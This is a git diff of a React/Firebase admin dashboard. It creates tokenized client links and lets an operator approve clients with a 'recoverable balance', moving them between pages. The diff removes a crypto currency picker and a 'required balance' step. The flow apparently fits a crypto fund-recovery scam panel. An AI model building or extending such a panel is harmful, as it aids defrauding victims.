@@ -12,6 +12,8 @@ import {
   doc,
   getDoc,
   updateDoc,
+  query,
+  where,
   onSnapshot,
 } from "firebase/firestore";
 import { v4 as uuidv4 } from "uuid";
@@ -24,14 +26,8 @@ export default function AdminDashboard() {
   const [loading, setLoading] = useState(true);
   const [isAdmin, setIsAdmin] = useState(false);
 
-  // Popup state for proceed1
   const [popupClient, setPopupClient] = useState<any>(null);
   const [recoverableBalance, setRecoverableBalance] = useState("");
-  const [currency, setCurrency] = useState("BTC");
-
-  // Popup state for proceed2
-  const [popupClient2, setPopupClient2] = useState<any>(null);
-  const [requiredBalance, setRequiredBalance] = useState("");
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, async (u) => {
@@ -40,6 +36,7 @@ export default function AdminDashboard() {
         return;
       }
 
+      // Check admin privilege
       const adminRef = doc(db, "admins", u.uid);
       const adminSnap = await getDoc(adminRef);
 
@@ -67,59 +64,45 @@ export default function AdminDashboard() {
     setLinks(allLinks);
   };
 
- const generateLink = async () => {
-   if (!clientName) {
-     alert("Enter client name");
-     return;
-   }
+  const generateLink = async () => {
+    if (!clientName) {
+      alert("Enter client name");
+      return;
+    }
 
-   const urlId = uuidv4();
+    const urlId = uuidv4();
 
-   // Set expire time to 48 hours from now
-   const expireTime = new Date().getTime() + 48 * 60 * 60 * 1000; // 48 hours in milliseconds
+    await addDoc(collection(db, "access_links"), {
+      clientName,
+      urlId,
+      createdBy: user.uid,
+      currentPage: "page1",
+      expiresAt: null,
+      createdAt: serverTimestamp(),
+    });
 
-   await addDoc(collection(db, "access_links"), {
-     clientName,
-     urlId,
-     createdBy: user.uid,
-     currentPage: "page1",
-     expiresAt: expireTime, // expires in 48 hours
-     createdAt: serverTimestamp(),
-   });
+    setClientName("");
+    fetchLinks();
 
-   setClientName("");
-   fetchLinks();
+    alert(`${window.location.origin}/page1?token=${urlId}`);
+  };
 
-   alert(`${window.location.origin}/page1?token=${urlId}`);
- };
-
-
-  // Watch clients for popups
+  // Watch clients for proceed1 creation
   const watchClients = async () => {
     const clientsCol = collection(db, "clients");
 
+    // Listen for any new client documents where proceed1 is false (created but not processed)
     onSnapshot(clientsCol, (snapshot) => {
       snapshot.docs.forEach((docSnap) => {
         const data = docSnap.data();
-
-        // proceed1 popup
-        if (data.proceed1 === false && !popupClient) {
+        if (data.proceed1 === false) {
           setPopupClient({ id: docSnap.id, ...data });
-        }
-
-        // proceed2 popup
-        if (
-          data.proceed2 === false &&
-          data.currentPage === "page5" &&
-          !popupClient2
-        ) {
-          setPopupClient2({ id: docSnap.id, ...data });
         }
       });
     });
   };
 
-  const handleSubmitProceed1 = async () => {
+  const handleSubmitProceed = async () => {
     if (!recoverableBalance || isNaN(Number(recoverableBalance))) {
       alert("Enter valid recoverable balance");
       return;
@@ -130,35 +113,13 @@ export default function AdminDashboard() {
     const clientRef = doc(db, "clients", popupClient.id);
     await updateDoc(clientRef, {
       recoverableBalance: Number(recoverableBalance),
-      currency,
       proceed1: true,
-      currentPage: "page3",
     });
 
+    // Close popup
     setPopupClient(null);
     setRecoverableBalance("");
-    setCurrency("BTC");
-    alert(`${popupClient.name} approved to proceed to Page 3`);
-  };
-
-  const handleSubmitProceed2 = async () => {
-    if (!requiredBalance || isNaN(Number(requiredBalance))) {
-      alert("Enter valid required balance");
-      return;
-    }
-
-    if (!popupClient2) return;
-
-    const clientRef = doc(db, "clients", popupClient2.id);
-    await updateDoc(clientRef, {
-      requiredBalance: Number(requiredBalance),
-      proceed2: true,
-      currentPage: "page6", // routes client to page6
-    });
-
-    setPopupClient2(null);
-    setRequiredBalance("");
-    alert(`${popupClient2.name} approved to proceed to Page 6`);
+    alert(`${popupClient.name} is approved to proceed to Page 3`);
   };
 
   if (loading) {
@@ -190,6 +151,7 @@ export default function AdminDashboard() {
             <label className="text-sm text-gray-400 block mb-2">
               Client Name
             </label>
+
             <div className="relative">
               <input
                 value={clientName}
@@ -225,7 +187,7 @@ export default function AdminDashboard() {
           </div>
         </div>
 
-        {/* Popup for proceed1 */}
+        {/* Popup form for proceed1 */}
         {popupClient && (
           <div className="fixed inset-0 scrollbar-hidden bg-black/70 flex items-center justify-center z-50">
             <div className="bg-[#0E111C] p-6 rounded-xl max-w-md w-full space-y-4">
@@ -233,68 +195,19 @@ export default function AdminDashboard() {
                 Approve {popupClient.name}
               </h2>
 
-              <div className="flex gap-2">
-                <div className="flex-1">
-                  <label className="text-gray-400 text-sm">
-                    Recoverable Balance
-                  </label>
-                  <input
-                    type="number"
-                    value={recoverableBalance}
-                    onChange={(e) => setRecoverableBalance(e.target.value)}
-                    placeholder="Enter recoverable balance"
-                    className="w-full bg-[#151A2E] p-3 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
-                  />
-                </div>
-
-                <div className="w-32">
-                  <label className="text-gray-400 text-sm">Currency</label>
-                  <select
-                    value={currency}
-                    onChange={(e) => setCurrency(e.target.value)}
-                    className="w-full bg-[#151A2E] p-3 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
-                  >
-                    <option value="BTC">BTC</option>
-                    <option value="ETH">ETH</option>
-                    <option value="USDT">USDT</option>
-                    <option value="BNB">BNB</option>
-                  </select>
-                </div>
-              </div>
+              <label className="text-gray-400 text-sm">
+                Recoverable Balance
+              </label>
+              <input
+                type="number"
+                value={recoverableBalance}
+                onChange={(e) => setRecoverableBalance(e.target.value)}
+                placeholder="Enter recoverable balance"
+                className="w-full bg-[#151A2E] p-3 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
+              />
 
               <button
-                onClick={handleSubmitProceed1}
-                className="w-full bg-teal-600 hover:bg-teal-500 p-3 rounded-xl font-semibold text-white"
-              >
-                Approve and Proceed
-              </button>
-            </div>
-          </div>
-        )}
-
-        {/* Popup for proceed2 */}
-        {popupClient2 && (
-          <div className="fixed inset-0 scrollbar-hidden bg-black/70 flex items-center justify-center z-50">
-            <div className="bg-[#0E111C] p-6 rounded-xl max-w-md w-full space-y-4">
-              <h2 className="text-white text-lg font-bold">
-                Approve {popupClient2.name} (Page 5)
-              </h2>
-
-              <div className="flex flex-col gap-2">
-                <label className="text-gray-400 text-sm">
-                  Required Balance
-                </label>
-                <input
-                  type="number"
-                  value={requiredBalance}
-                  onChange={(e) => setRequiredBalance(e.target.value)}
-                  placeholder="Enter required balance"
-                  className="w-full bg-[#151A2E] p-3 rounded-lg text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
-                />
-              </div>
-
-              <button
-                onClick={handleSubmitProceed2}
+                onClick={handleSubmitProceed}
                 className="w-full bg-teal-600 hover:bg-teal-500 p-3 rounded-xl font-semibold text-white"
               >
                 Approve and Proceed
